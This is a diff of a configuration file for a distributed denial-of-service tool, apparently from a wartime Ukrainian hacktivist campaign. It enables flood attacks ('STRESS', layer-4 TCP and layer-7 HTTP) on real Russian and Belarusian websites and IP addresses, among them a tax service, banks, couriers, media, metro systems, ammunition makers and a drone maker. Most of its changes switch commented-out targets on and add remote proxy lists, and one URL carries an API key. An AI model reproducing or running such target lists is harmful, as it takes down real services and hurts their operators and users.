@@ -1,18 +1,18 @@
 #Рядки, що починаються на # - не беруться в атаку!
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_url --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_url --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_http --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_http --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l4_tcp
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/IPTV/iptv_l7_url --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/IPTV/iptv_l7_url --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/IPTV/iptv_l7_http --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/IPTV/iptv_l7_http --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/IPTV/iptv_l4_tcp
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/IPTV/iptv_l4_tcp
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/amediateka --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/amediateka --http-methods GET STRESS
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/platon/platon_l7 --http-methods GET STRESS
 
@@ -34,9 +34,9 @@
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/test/sber_api --http-methods GET STRESS
 
-#https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://edo-gismt.crpt.ru/ https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://suz2.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ https://апи.национальный-каталог.рф/ https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey=6A9769C235F432 https://suzgrid.crpt.ru:16443/api/v2/integration/connection https://nrz.api.mdlp.crpt.ru tcp://91.230.251.101:443 --http-methods GET STRESS
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://edo-gismt.crpt.ru/ https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://suz2.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ https://апи.национальный-каталог.рф/ https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey=6A9769C235F432 https://suzgrid.crpt.ru:16443/api/v2/integration/connection https://nrz.api.mdlp.crpt.ru tcp://91.230.251.101:443 --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/api_crpt --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/api_crpt --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
 #http://nnoblsud.ru https://mosmetro.ru https://job.mosmetro.ru https://mis.mosmetro.ru/login.php https://app-bucket.mosmetro.ru https://shop.mosmetro.ru https://mcd.mosmetro.ru https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/ https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/ https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/ https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS
 
@@ -44,45 +44,41 @@
 
 #https://okko.tv https://mimimi.okko.team/ https://pobeda.okko.tv https://www.ontvtime.ru https://www.amediateka.ru https://kodiki.amediateka.ru/ https://rt.amediateka.ru/ https://akado.amediateka.ru/ https://wink.ru https://www.1tv.ru/live https://cm.1tv.ru/ https://tlxmob.1tv.ru/ https://25.1tv.ru/ https://kino.1tv.ru/ https://users.1tv.ru/ http://edu.1tv.ru/ https://admin.kino.1tv.ru/ https://stage.1tv.ru/ https://subscr.1tv.ru/ https://kino-teatr.ru http://m.kino-teatr.ru/ https://mt.kino-teatr.ru/ --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET APACHE POST
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET APACHE POST
 
 #https://vetrf.ru/ https://idp.vetrf.ru/idp/profile/SAML2/POST/SSO?execution=e1s1 https://duma.vetrf.ru/ https://vesta.vetrf.ru/ https://accounts.vetrf.ru https://cerberus.vetrf.ru/cerberus/ https://ecert.vetrf.ru https://help.vetrf.ru/wiki/ https://t2-idp.vetrf.ru/idp/ https://t2-aplms.vetrf.ru/pub/ --http-methods GET STRESS
 
 #https://62.76.145.83:443 http://62.76.145.85:8443 http://62.76.145.203:80 http://62.76.145.203:8080 tcp://62.76.145.85:8443 tcp://62.76.145.84:443 tcp://62.76.145.10:80 tcp://62.76.145.10:443 --http-methods GET STRESS
 
-#https://www.cdek.ru https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru https://boxberry.ru https://u.boxberry.ru/ https://www.cse.ru --http-methods GET STRESS
+https://www.cdek.ru https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru https://boxberry.ru https://u.boxberry.ru/ https://www.cse.ru --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
-#http://178.248.238.208:80 http://193.232.108.86:80 https://193.107.237.86:443 https://185.65.22.9:443 http://194.49.120.60:80 https://194.49.120.60:443 tcp://178.248.232.188:80 tcp://178.248.232.188:443 --http-methods GET STRESS
+http://178.248.238.208:80 http://193.232.108.86:80 https://193.107.237.86:443 https://185.65.22.9:443 http://194.49.120.60:80 https://194.49.120.60:443 tcp://178.248.232.188:80 tcp://178.248.232.188:443 --http-methods GET STRESS
 
 #https://www.cdek.ru https://cdekid.cdek.ru https://tender-buy.cdek.ru/Tenders https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru  --http-methods GET STRESS
 
 #https://195.189.222.59:443 https://194.49.120.61:443 http://195.189.222.42:80 tcp://195.189.222.62:25 https://194.49.120.60:443 https://194.49.120.61:443 tcp://195.189.222.62:465 tcp://194.49.120.61:443 tcp://195.189.222.58:80 tcp://195.189.222.58:465 tcp://178.248.234.88:80 --http-methods GET STRESS
 
-#http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
+http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
 
-#https://www.cryptopro.ru/order/OrderForm.aspx?catid=c26ac260-7cfc-e811-870f-0025900a9ce7~ http://178.238.112.83:80 http://178.238.112.83:443 https://178.238.112.83:443 tcp://178.238.112.83:80 tcp://178.238.112.83:443 --http-methods GET STRESS
+https://www.cryptopro.ru/order/OrderForm.aspx?catid=c26ac260-7cfc-e811-870f-0025900a9ce7~ http://178.238.112.83:80 http://178.238.112.83:443 https://178.238.112.83:443 tcp://178.238.112.83:80 tcp://178.238.112.83:443 --http-methods GET STRESS
 
-#https://zala-aero.com/about/ https://zala-aero.com/production/ http://37.143.13.3:80 http://37.143.13.3:443 https://37.143.13.3:443 http://37.143.13.3:1500 https://37.143.13.3:1500 tcp://37.143.13.3:21 tcp://37.143.13.3:22 tcp://37.143.13.3:25 tcp://37.143.13.3:80 tcp://37.143.13.3:110 tcp://37.143.13.3:123 tcp://37.143.13.3:143 tcp://37.143.13.3:443 tcp://37.143.13.3:993 tcp://37.143.13.3:995 tcp://37.143.13.3:1500 --http-methods GET STRESS
+https://zala-aero.com/about/ https://zala-aero.com/production/ http://37.143.13.3:80 http://37.143.13.3:443 https://37.143.13.3:443 http://37.143.13.3:1500 https://37.143.13.3:1500 tcp://37.143.13.3:21 tcp://37.143.13.3:22 tcp://37.143.13.3:25 tcp://37.143.13.3:80 tcp://37.143.13.3:110 tcp://37.143.13.3:123 tcp://37.143.13.3:143 tcp://37.143.13.3:443 tcp://37.143.13.3:993 tcp://37.143.13.3:995 tcp://37.143.13.3:1500 --http-methods GET STRESS
 
-#https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.13:443 https://87.236.16.13:443 tcp://87.236.16.13:21 tcp://87.236.16.13:22 tcp://87.236.16.13:80 tcp://87.236.16.13:443 --http-methods GET STRESS
+https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.13:443 https://87.236.16.13:443 tcp://87.236.16.13:21 tcp://87.236.16.13:22 tcp://87.236.16.13:80 tcp://87.236.16.13:443 --http-methods GET STRESS
 
-#https://moe-online.ru/news --http-methods GET STRESS
+https://moe-online.ru/news --http-methods GET STRESS
 
-#http://new.kspz.ru/ http://ulnammo.ru/vp/ http://www.barnaulpatron.ru/ru/ http://xn----7sbb5bnffjmff.xn--p1ai/en/index.php https://lztamarshal.ru/catalog/ http://www.tulammo.ru/en/ http://90.156.201.18:80 http://90.156.201.45:80 http://90.156.201.107:80 http://90.156.201.117:80 http://95.104.194.195:80 http://77.222.61.193:80 http://91.189.114.18:80 http://31.31.198.239:80 https://31.31.198.239:443 http://91.189.114.18:80 --http-methods GET STRESS
+http://new.kspz.ru/ http://ulnammo.ru/vp/ http://www.barnaulpatron.ru/ru/ http://xn----7sbb5bnffjmff.xn--p1ai/en/index.php https://lztamarshal.ru/catalog/ http://www.tulammo.ru/en/ http://90.156.201.18:80 http://90.156.201.45:80 http://90.156.201.107:80 http://90.156.201.117:80 http://95.104.194.195:80 http://77.222.61.193:80 http://91.189.114.18:80 http://31.31.198.239:80 https://31.31.198.239:443 http://91.189.114.18:80 --http-methods GET STRESS
 
-#http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://195.50.4.54:443 --http-methods STRESS GET
+http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://195.50.4.54:443 --http-methods STRESS GET
 
 #https://alfabank.ru https://vtb.ru https://online.vtb.ru/login https://login.avangard.ru https://www.tinkoff.ru/ --http-methods GET STRESS
 
 #https://193.222.109.135:443 https://193.222.109.11:443 https://193.222.109.82:2001 tcp://217.12.96.27:25 tcp://217.12.96.18:25 tcp://217.12.97.18:25 tcp://193.164.146.180:25 tcp://193.164.146.181:25 tcp://193.164.146.179:25 tcp://195.242.83.129:8008 tcp://193.222.109.99:443 --http-methods GET STRESS
 
-#https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET STRESS
+https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET STRESS
 
-#https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
-
-#https://zala-aero.com/about/ https://zala-aero.com/production/ http://37.143.13.3:80 http://37.143.13.3:443 https://37.143.13.3:443 http://37.143.13.3:1500 https://37.143.13.3:1500 tcp://37.143.13.3:21 tcp://37.143.13.3:22 tcp://37.143.13.3:25 tcp://37.143.13.3:80 tcp://37.143.13.3:110 tcp://37.143.13.3:123 tcp://37.143.13.3:143 tcp://37.143.13.3:443 tcp://37.143.13.3:993 tcp://37.143.13.3:995 tcp://37.143.13.3:1500 --http-methods GET STRESS
-
-#https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.13:443 https://87.236.16.13:443 tcp://87.236.16.13:21 tcp://87.236.16.13:22 tcp://87.236.16.13:80 tcp://87.236.16.13:443 --http-methods GET STRESS
+https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
 
 #http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 https://95.173.145.58:443 http://95.173.145.58:8080 tcp://95.173.145.58:80 tcp://95.173.145.58:443 tcp://95.173.145.58:8080 --http-methods GET STRESS
 
@@ -90,7 +86,7 @@
 
 #-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4.lst
 
-#-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS STRESS
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods GET POST
 
 #-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
 
@@ -98,6 +94,6 @@
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS --proxies https://raw.githubusercontent.com/alexnest-ua/special_files/main/screenshots/1.png
 
-#https://www.a-3.ru/pay_gaz --http-methods GET STRESS
+https://www.a-3.ru/pay_gaz --http-methods GET STRESS
